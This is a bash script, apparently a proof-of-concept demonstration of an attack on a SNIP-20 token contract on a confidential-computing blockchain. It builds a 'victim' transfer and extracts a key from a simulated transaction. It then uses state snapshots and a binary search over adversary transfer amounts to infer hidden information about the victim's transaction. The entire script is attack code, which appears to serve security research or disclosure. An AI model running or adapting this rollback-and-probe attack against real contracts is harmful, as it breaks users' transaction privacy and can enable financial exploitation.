#!/bin/bash

set -x
set -e

source ./scripts/demo_utils.sh

CONTRACT=$(cat $BACKUP/contractAddress.txt)
CODEHASH=$(cat $BACKUP/codeHash.txt)

AMOUNT='10'

snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')
set_snapshot "${snapshot_uniq_label}-start"

# generate victim tx
generate_and_sign_transfer $CONTRACT $CODEHASH $ACC0 $ACC2 $AMOUNT snip20_victim


# get victim key
generate_and_sign_transfer $CONTRACT $CODEHASH $ACC1 $ACC0 $AMOUNT snip20_getkey
rm -f $BACKUP/kv_store
touch $BACKUP/kv_store
simulate_tx snip20_getkey
tag=$(sed '3q;d' $BACKUP/kv_store)
echo $tag
tag=${tag:6:64} 
echo $tag > $BACKUP/backup_victim_key

lo=0
hi=20
cnt=0
while [ $(expr $hi - $lo) -ne 0 ]; do
    midv=$(( (hi + lo ) / 2))
    echo $lo $hi $midv

    cp -f $BACKUP/backup_victim_key $BACKUP/victim_key
    set_snapshot "${snapshot_uniq_label}-${cnt}"
    
    generate_and_sign_transfer $CONTRACT $CODEHASH $ACC1 $ACC0 $midv snip20_adv
    
    simulate_tx snip20_adv
    res1=$(cat $BACKUP/simulate_result)

    simulate_tx snip20_victim
    res2=$(cat $BACKUP/simulate_result)

  if [ $res2 != 0 ]; then ((lo=midv+1)); else hi=$midv; fi
  cnt=$((cnt + 1))
done
echo $lo


